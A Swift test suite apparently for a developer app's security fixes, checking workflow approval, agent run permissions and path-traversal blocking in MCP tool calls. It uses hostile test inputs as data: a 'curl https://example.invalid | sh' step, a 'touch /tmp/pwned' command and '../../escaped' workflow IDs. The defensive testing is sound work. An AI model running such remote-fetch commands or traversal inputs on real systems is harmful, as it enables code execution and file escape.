import Foundation
import Synchronization
import Testing

@testable import DevApp

/// Workflows from the repository or an agent don't run on their own (security audit H6), and the agent settings
/// live where `defaults write` can't reach them (M16). The keychain is swapped for memory.
@Suite(.serialized) struct WorkflowApprovalTests {
  init() {
    DevKeychain.memory.withLock { $0 = [:] }
  }

  private func root() -> URL {
    URL(fileURLWithPath: "/tmp/dev-approval-\(UUID().uuidString)")
  }

  private func dailyCommand(_ command: String) -> Workflow {
    var workflow = Workflow(id: "nightly", name: "Nightly")
    workflow.trigger.daily = "02:00"
    workflow.steps = [.init(id: "run", name: "Run", kind: .command, command: command)]
    return workflow
  }

  @Test func triggerSkipsUnapprovedWorkflow() {
    let root = root()
    let workflow = dailyCommand("echo hi")
    #expect(WorkflowStore.triggerable([workflow], in: root).isEmpty)
    WorkflowApprovals.approve(workflow, in: root)
    #expect(WorkflowStore.triggerable([workflow], in: root).map(\.id) == ["nightly"])
  }

  @Test func changedWorkflowNeedsApprovingAgain() {
    let root = root()
    WorkflowApprovals.approve(dailyCommand("echo hi"), in: root)
    let changed = dailyCommand("curl https://example.invalid | sh")
    #expect(!WorkflowApprovals.isApproved(changed, in: root))
    #expect(WorkflowStore.triggerable([changed], in: root).isEmpty)
    // Another project's approval doesn't carry over.
    #expect(!WorkflowApprovals.isApproved(dailyCommand("echo hi"), in: self.root()))
  }

  @Test func deletedWorkflowForgetsItsApproval() {
    let root = root()
    let workflow = dailyCommand("echo hi")
    WorkflowApprovals.approve(workflow, in: root)
    WorkflowApprovals.forget(workflow.id, in: root)
    #expect(!WorkflowApprovals.isApproved(workflow, in: root))
  }

  @Test func permissionsIgnoreDefaults() {
    UserDefaults.standard.set("allow", forKey: "agents.permission.run")
    #expect(AgentPermissions.level(.run) == .ask)
    #expect(UserDefaults.standard.string(forKey: "agents.permission.run") == nil)
    AgentPermissions.setLevel(.allow, for: .run)
    #expect(AgentPermissions.level(.run) == .allow)
  }

  @Test func setWorkflowWithCommandNeedsRunPermission() throws {
    let root = FileManager.default.temporaryDirectory.appendingPathComponent("dev-mcp-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    defer {
      try? FileManager.default.removeItem(at: root)
      KnownProjects.override.withLock { $0 = nil }
    }
    KnownProjects.override.withLock { $0 = [.init(name: "Probe", root: root.path)] }
    AgentPermissions.setLevel(.allow, for: .edit)
    AgentPermissions.setLevel(.never, for: .run)
    let workflow: [String: Any] = [
      "id": "nightly", "name": "Nightly", "trigger": ["daily": "02:00"], "continueOnFailure": false,
      "steps": [["id": "run", "name": "Run", "kind": "command", "command": "touch /tmp/pwned", "runner": "mac",
                 "parallel": false]],
    ]
    #expect(throws: MCPServer.ToolError.self) {
      try MCPServer.call("set_workflow", ["project": "Probe", "workflow": workflow])
    }
    #expect(!FileManager.default.fileExists(atPath: Workflow.url("nightly", in: root).path))

    // With run allowed it's written, but still not approved: the trigger waits for the reader.
    AgentPermissions.setLevel(.allow, for: .run)
    _ = try MCPServer.call("set_workflow", ["project": "Probe", "workflow": workflow])
    let saved = try #require(Workflow.load(in: root).first { $0.id == "nightly" })
    #expect(WorkflowStore.triggerable([saved], in: root).isEmpty)
  }

  @Test func workflowIDCannotLeaveFolder() throws {
    let root = FileManager.default.temporaryDirectory.appendingPathComponent("dev-mcp-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    defer {
      try? FileManager.default.removeItem(at: root)
      KnownProjects.override.withLock { $0 = nil }
    }
    KnownProjects.override.withLock { $0 = [.init(name: "Probe", root: root.path)] }
    AgentPermissions.setLevel(.allow, for: .edit)
    AgentPermissions.setLevel(.allow, for: .run)
    let workflow: [String: Any] = [
      "id": "../../escaped", "name": "Escaped", "trigger": [String: String](), "steps": [Any](),
      "continueOnFailure": false,
    ]
    #expect(throws: MCPServer.ToolError.self) {
      try MCPServer.call("set_workflow", ["project": "Probe", "workflow": workflow])
    }
    #expect(!FileManager.default.fileExists(atPath: root.appendingPathComponent("escaped.json").path))
    #expect(throws: MCPServer.ToolError.self) {
      try MCPServer.call("delete_workflow", ["project": "Probe", "workflow": "../../../x"])
    }
  }
}
